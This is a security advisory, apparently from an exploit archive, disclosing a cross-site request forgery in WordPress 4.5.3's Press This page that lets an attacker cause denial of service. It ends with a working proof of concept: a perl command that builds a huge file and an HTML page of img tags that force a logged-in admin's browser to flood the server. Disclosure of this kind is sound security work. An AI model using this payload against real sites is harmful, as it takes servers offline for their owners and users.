@@ -1,0 +1,61 @@
+id: 27236
+date: 03/07/2017
+title: WordPress 4.5.3 Press This Function CSRF / Denial Of Service Vulnerabilities
+author: Sipke Mellema
+cves: 
+
+------------------------------------------------------------------------
+Cross-Site Request Forgery in WordPress Press This function allows DoS
+------------------------------------------------------------------------
+Sipke Mellema, July 2016
+
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+A Cross-Site Request Forgery (CSRF) vulnerability exists on the Press
+This page of WordPress. This issue can be used to create a Denial of
+Service (DoS) condition  if an authenticated administrator visits a
+malicious URL.
+
+------------------------------------------------------------------------
+OVE ID
+------------------------------------------------------------------------
+OVE-20160718-0005
+
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+This issue was successfully tested on WordPress version 4.5.3.
+
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+This issue is resolved in WordPress version 4.7.3.
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
+
+WordPress' Press This function allows quick publishing with a special web browser bookmarklet. An admin can also visit the Press This page directly. One of the features of Press This is scanning an external server for embeddable content. This is done with a GET request to:
+/wp-admin/press-this.php?u=<URL>&url-scan-submit=Scan
+
+When this URL is called, Press This will download the page located at "URL" and look for content such as images and other embeddable elements. No maximum is set for the amount of data Press This can retrieve when scanning. This behavior can be abused by setting the external URL to a huge file and have an authenticated admin visit it. The PHP process will use 100% of its CPU resources to process the file. If an authenticated admin can be lured to an external page, then the malicious URL can be called many times, blocking all PHP server threads. This will cause the server to be unreachable for a while.
+Proof of concept
+
+On an external server, create a large text file with the command:
+perl -e 'print "<>"x28000000' > foo.txt
+
+Next, create a file called dos.html on the external server with enough entries to fill the connection pool of the WordPress server, as follows:
+<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
+<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
+<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
+<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=e'>
+<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=f'>
+<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=g'>
+[..]
+(replace <wp server> with the WordPress server address and <external server> with the external server)
+
+Now have a logged in admin visit dos.html. The server will be down for a while.
+
+#  0day.today [2023-03-22]  #
